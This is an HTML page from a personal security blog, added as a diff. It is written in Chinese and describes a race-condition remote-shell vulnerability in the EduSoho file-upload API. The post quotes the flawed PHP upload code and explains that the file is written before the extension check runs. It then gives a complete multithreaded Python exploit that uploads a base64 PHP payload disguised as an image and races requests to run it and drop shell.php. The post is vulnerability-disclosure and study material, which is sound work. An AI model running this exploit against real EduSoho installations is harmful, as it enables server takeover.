@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html>
+  <!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  
+  <title>Edusoho前台条件竞争Getshell - x1a0t&#39;s Blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+  
+  <meta name="keywords" content=PHP,GETSHELL>
+  
+  
+    <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=1.02">
+  
+  
+    <link rel="alternate" href="/atom.xml " title="x1a0t&#39;s Blog" type="application/atom+xml">
+  
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 7.2.0"></head>
+  <body>
+    <div class="container">
+      <header class="header">
+  <div class="blog-title">
+    <a href="/" class="logo">x1a0t&#39;s Blog</a>
+    <div class="subtitle"></div>
+  </div>
+  <nav class="navbar">
+    <ul class="menu">
+      
+        <li class="menu-item">
+          <a href="/" class="menu-item-link">Home</a>
+        </li>
+      
+        <li class="menu-item">
+          <a href="/links" class="menu-item-link">Links</a>
+        </li>
+      
+        <li class="menu-item">
+          <a href="/notes" class="menu-item-link">Notes</a>
+        </li>
+      
+        <li class="menu-item">
+          <a href="/about" class="menu-item-link">About</a>
+        </li>
+      
+    </ul>
+  </nav>
+</header>
+<article class="post">
+  <div class="post-title">
+    <h1 class="article-title">Edusoho前台条件竞争Getshell</h1>
+  </div>
+   <div class="post-meta">
+    <span class="post-time">2020-02-16</span>
+    
+      <ul class="post-tag-list" itemprop="keywords"><li class="post-tag-list-item"><a class="post-tag-list-link" href="/tags/GETSHELL/" rel="tag">GETSHELL</a></li><li class="post-tag-list-item"><a class="post-tag-list-link" href="/tags/PHP/" rel="tag">PHP</a></li></ul>
+    
+  </div>
+  <div class="post-content">
+    <h2 id="代码逻辑"><a href="#代码逻辑" class="headerlink" title="代码逻辑"></a>代码逻辑</h2><p>src&#x2F;ApiBundle&#x2F;Api&#x2F;Resource&#x2F;File&#x2F;File.php:10</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> <span class="keyword">extends</span> <span class="title">AbstractResource</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params">ApiRequest <span class="variable">$request</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$file</span> = <span class="variable">$request</span>-&gt;request-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;file&#x27;</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="variable">$file</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">fileDecode</span>(<span class="variable">$file</span>);   <span class="comment">//文件写入</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$file</span>)) &#123;</span><br><span class="line">            <span class="variable">$file</span> = <span class="variable">$request</span>-&gt;<span class="title function_ invoke__">getHttpRequest</span>()-&gt;files-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;file&#x27;</span>, <span class="literal">null</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$file</span>)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="title class_">FileException</span>::<span class="title function_ invoke__">FILE_NOT_UPLOAD</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$group</span> = <span class="variable">$request</span>-&gt;request-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;group&#x27;</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$group</span>, <span class="keyword">array</span>(<span class="string">&#x27;tmp&#x27;</span>, <span class="string">&#x27;user&#x27;</span>, <span class="string">&#x27;course&#x27;</span>, <span class="string">&#x27;system&#x27;</span>))) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="title class_">FileException</span>::<span class="title function_ invoke__">FILE_GROUP_INVALID</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//检测文件后缀合法性，删除操作</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getFileService</span>()-&gt;<span class="title function_ invoke__">uploadFile</span>(<span class="variable">$group</span>, <span class="variable">$file</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">fileDecode</span>(<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$str</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$str</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// data:&#123;mimeType&#125;;base64,&#123;code&#125;</span></span><br><span class="line">        <span class="variable">$user</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getCurrentUser</span>();</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^(data:\s*image\/(\w+);base64,)/&#x27;</span>, <span class="variable">$str</span>, <span class="variable">$result</span>)) &#123;</span><br><span class="line">            <span class="variable">$filePath</span> = <span class="variable language_">$this</span>-&gt;biz[<span class="string">&#x27;topxia.upload.public_directory&#x27;</span>].<span class="string">&#x27;/tmp/&#x27;</span>.<span class="variable">$user</span>[<span class="string">&#x27;id&#x27;</span>].<span class="string">&#x27;_&#x27;</span>.<span class="title function_ invoke__">time</span>().<span class="string">&#x27;.&#x27;</span>.<span class="variable">$result</span>[<span class="number">2</span>];</span><br><span class="line">            <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filePath</span>, <span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">str_replace</span>(<span class="variable">$result</span>[<span class="number">1</span>], <span class="string">&#x27;&#x27;</span>, <span class="variable">$str</span>)));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">FileObject</span>(<span class="variable">$filePath</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到函数fileDecode是文件写入操作，然而在进入后缀检测代码之前，有两个抛错语句</p>
+<p>这里就存在一种逻辑问题，如果前面的代码抛错使php退出，就不会执行后面的删除操作了，shell文件会驻留在</p>
+<p>第一个抛错是当<code>$file</code>为空时，很显然无法利用</p>
+<p>第二个抛错是当<code>$group</code>不在白名单中，传入<code>group=xxx</code>即可令php报错退出</p>
+<h2 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h2><p>在我提交该漏洞一年后，我再次看了下官方的修复<br><img src="/2020/02/16/Edusoho-Getshell/1.png"><br>官方将对<code>$group</code>值判断的代码提前了，盯着代码看了好几遍，才发现我一直忽视了这里真正导致漏洞的原因</p>
+<p><strong>这里的代码最不应该的是，将判断后缀的代码，放在文件写入后面</strong></p>
+<p>也就是说存在条件竞争漏洞，在php脚本删除之前仍然有机会请求到php脚本，执行代码</p>
+<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>首先需要判断目标&#x2F;files&#x2F;tmp&#x2F;下的php脚本可访问，然后注册账号后获取uid<br><img src="/2020/02/16/Edusoho-Getshell/uid.png"></p>
+<p>用多线程脚本疯狂请求</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">from threading import Thread</span><br><span class="line">import requests</span><br><span class="line">from base64 import b64encode</span><br><span class="line">from time import time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">target = &#x27;http://xxx.xxx.com&#x27;</span><br><span class="line">account = b&#x27;test123:test123&#x27;</span><br><span class="line">uid = 314</span><br><span class="line"></span><br><span class="line">def upload():</span><br><span class="line">    url = target + &#x27;/api/file&#x27;</span><br><span class="line">    headers = &#123;</span><br><span class="line">        &#x27;Accept&#x27;: &#x27;application/vnd.edusoho.v2+json&#x27;,</span><br><span class="line">        &#x27;Authorization&#x27;: &#x27;Basic &#x27; + b64encode(account).decode(&#x27;utf-8&#x27;),</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    shell = b&#x27;&lt;?php file_put_contents(&quot;shell.php&quot;, &quot;&lt;?php var_dump(md5(666));?&gt;&quot;);?&gt;&#x27;</span><br><span class="line">    base64shell = b64encode(shell).decode(&#x27;utf-8&#x27;)</span><br><span class="line">    data = &#123;</span><br><span class="line">        &#x27;group&#x27;: &#x27;tmp&#x27;,</span><br><span class="line">        &#x27;file&#x27;: &#x27;data:image/php;base64,&#x27; + base64shell,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    while 1:</span><br><span class="line">        try:</span><br><span class="line">            requests.post(url, data=data, headers=headers)</span><br><span class="line">        except KeyboardInterrupt:</span><br><span class="line">            return</span><br><span class="line">        except:</span><br><span class="line">            pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def request():</span><br><span class="line">    while 1:</span><br><span class="line">        try:</span><br><span class="line">            url = target + &#x27;/files/tmp/&#123;&#125;_&#123;&#125;.php&#x27;.format(uid, int(time()))</span><br><span class="line">            resp = requests.get(url)</span><br><span class="line">            if resp.status_code == 200:</span><br><span class="line">                print(target + &#x27;/files/tmp/shell.php&#x27;)</span><br><span class="line">                return</span><br><span class="line">        except KeyboardInterrupt:</span><br><span class="line">            return</span><br><span class="line">        except:</span><br><span class="line">            pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    up = Thread(target=upload)</span><br><span class="line">    threads = []</span><br><span class="line">    for i in range(20):</span><br><span class="line">        th = Thread(target=request)</span><br><span class="line">        threads.append(th)</span><br><span class="line"></span><br><span class="line">    up.start()</span><br><span class="line">    for th in threads:</span><br><span class="line">        th.start()</span><br><span class="line">    </span><br><span class="line">    for th in threads:</span><br><span class="line">        th.join()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/02/16/Edusoho-Getshell/3.png"></p>
+<h2 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h2><ol>
+<li>Linux下的<code>base64</code>命令编码后，然后php解码，发现帐号密码被添加了一个<code>\n</code>，导致利用的时候，一直报密码错误，mmp<br><img src="/2020/02/16/Edusoho-Getshell/2.png"></li>
+<li>没读官方文档，不知道官方给了个配置文件示例，提醒站长禁止files目录下php脚本的执行，漏洞危害降低</li>
+</ol>
+<h2 id="后话"><a href="#后话" class="headerlink" title="后话"></a>后话</h2><ol>
+<li>是<code>echo</code>添加的<code>\n</code>，正确用法<code>echo -n &#39;xxx&#39; | base64</code></li>
+<li>现在发现官方的nginx配置文件示例，有严重问题(还好又提醒站长仅适用与开发环境)，欣赏一下<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">    location ~ \.php$ &#123;</span><br><span class="line">        # [改] 请根据实际php-fpm运行的方式修改</span><br><span class="line">        fastcgi_pass   127.0.0.1:9000;</span><br><span class="line">        fastcgi_split_path_info ^(.+\.php)(/.*)$;</span><br><span class="line">        include fastcgi_params;</span><br><span class="line">        fastcgi_param  SCRIPT_FILENAME    $document_root$fastcgi_script_name;</span><br><span class="line">        fastcgi_param  HTTP_PROXY         &quot;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    # 省略部分配置</span><br><span class="line"></span><br><span class="line">    # 禁止用户上传目录下所有.php文件的访问，提高安全性</span><br><span class="line">    location ~ ^/files/.*\.(php|php5)$ &#123;</span><br><span class="line">        deny all;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+</ol>
+
+  </div>
+  <div class="post-footer">
+    <a href="#top" class="top">Post.Top</a>
+  </div>
+</article>
+<footer>
+  &copy; 2024
+  <span class="author">
+    x1a0t
+  </span>
+</footer>
+    </div>
+  </body>
+</html>
